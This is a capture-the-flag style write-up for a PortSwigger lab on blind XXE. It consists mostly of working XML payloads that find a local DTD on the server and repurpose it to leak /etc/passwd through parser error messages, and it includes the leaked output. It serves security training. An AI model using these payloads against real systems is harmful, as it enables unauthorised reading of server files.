# Lab: Exploiting XXE to retrieve data by repurposing a local DTD
# https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

```bash
# Send stock request to repeater and update xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abc [<!ENTITY % aba SYSTEM "file:///etc/abcdef">%aba;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

# Response: "XML parser exited with error: java.io.FileNotFoundException: /etc/abcdef (No such file or directory)"
```
```bash
# We will brute force known existing files from https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt.
# Send code to intruder and add marks to this part:

"file://§/etc/abcdef§">

# After that copy and paste known existing files and start attacking.
# Normally it should work but didn't work on me so i manually just tested

<!DOCTYPE abc [<!ENTITY % aba SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">%aba;]>

# It response with OK message so we can use this.
```

```bash
# Send this from repeater:

<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

# Response:

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

```
